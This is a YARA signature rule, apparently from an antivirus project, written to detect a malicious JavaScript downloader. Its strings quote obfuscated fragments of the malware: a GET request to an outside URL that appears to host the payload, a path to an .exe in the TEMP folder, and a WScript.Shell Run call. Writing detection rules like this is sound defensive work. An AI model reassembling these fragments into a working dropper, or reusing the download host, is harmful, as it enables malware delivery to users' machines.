rule sig_20160328_625ef8e5b7856848b997f24da5a91b38 {
  meta:
    description = "datamaliciousorder - file 20160328_625ef8e5b7856848b997f24da5a91b38.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4c09c26df5965224131710767e322a6b39502384517f09cd34f7fb1f0c7a67de"

  strings:
    $s1  = "function Zpkgpnea() {return Littonfz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"hWgU82JMwdt.exe\";};" fullword ascii
    $s2  = "do {WScript[Razfn](Jzhvke() * 11)} while (Rqxbvqtje[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Icmsvt(Dfedkzlwyy, Ghgpmfsz){return Dfedkzlwyy - Ghgpmfsz;};" fullword ascii
    $s4  = "var Littonfz = function Jxnmbbnwpg() {return WScript[Idwew](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Rqxbvqtje[Dzeigksw](\"GET\", \"http://lovelustandliving.ca/pow2lk\", false);" fullword ascii
    $s6  = "function Kkckron(Hcmwdz){Littonfz[\"Run\"](Hcmwdz, Skujkboo, Skujkboo);};" fullword ascii
    $s7  = "function Evaapgryyl(Yibwzj) {var Fictmlayq = (1, 2, 3, 4, 5, Yibwzj); return Fictmlayq;};" fullword ascii
    $s8  = "Tenegqua = true; " fullword ascii
    $s9  = "var Tenegqua = false;" fullword ascii
    $s10 = "function Jzhvke(){return 22;};" fullword ascii
    $s11 = "return Icmsvt(Erbnqev, Rcpwimy);" fullword ascii
    $s12 = "var Vkzbgtcz = false;" fullword ascii
    $s13 = "Uuixqcm = true; " fullword ascii
    $s14 = "function Dtvsan(){return Aurlktzkxq;};" fullword ascii
    $s15 = "function Ulpkoh()" fullword ascii
    $s16 = "var Uuixqcm = false;" fullword ascii
    $s17 = "function Qucbuv(){return Idwew;};" fullword ascii
    $s18 = " while (Wsugeqwi){" fullword ascii
    $s19 = "var Rmpaeub = new this[\"Date\"]();" fullword ascii
    $s20 = "function Lcaqjymzmk() {return ((Tenegqua == true) && (Tenegqua == Uuixqcm)) ? 1 : Skujkboo;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}